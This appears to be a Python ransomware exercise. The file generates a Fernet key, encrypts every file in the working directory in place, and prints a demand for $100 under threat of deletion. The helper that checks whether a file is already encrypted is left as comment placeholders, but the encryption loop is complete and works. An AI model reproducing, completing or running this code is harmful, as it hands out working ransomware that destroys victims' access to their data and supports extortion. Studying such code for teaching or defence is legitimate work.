from cryptography.fernet import Fernet
import os

# Define the function isEncrypted() that takes filePath and a key

    # Open the file path in rb mode as file

        # Use readline() method to read a line from file and store it in firstLine variable


        # Start try block

            # Attempt to decrypt the first line using Fernet

            # Return True

        # Except block

            # Return false



keyFile = "encryptedKey.key"
if not os.path.exists(keyFile):
    key = Fernet.generate_key()
    with open(keyFile, "wb") as encryptedKey:
        encryptedKey.write(key)
else:
    with open(keyFile, "rb") as encryptedKey:
        key = encryptedKey.read()


files = []

for path in os.listdir():
    if (path == "main.py" or path == "encryptedKey.key" or path == "decrypt.py"):
        continue
    if os.path.isfile(path):
        files.append(path)

for file in files:
    # Check the file is already encrypted or not by calling isEncrypted() function with file and key and store result in encrypted variable
    
    # Check if not encrypted

        # Perform following only if file is not encrypted
    with open(file, "rb") as file1:
        rawData = file1.read()
    encryptedRawData = Fernet(key).encrypt(rawData)
    with open(file, "wb") as file2:
        file2.write(encryptedRawData)
        file2.close()

    print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")
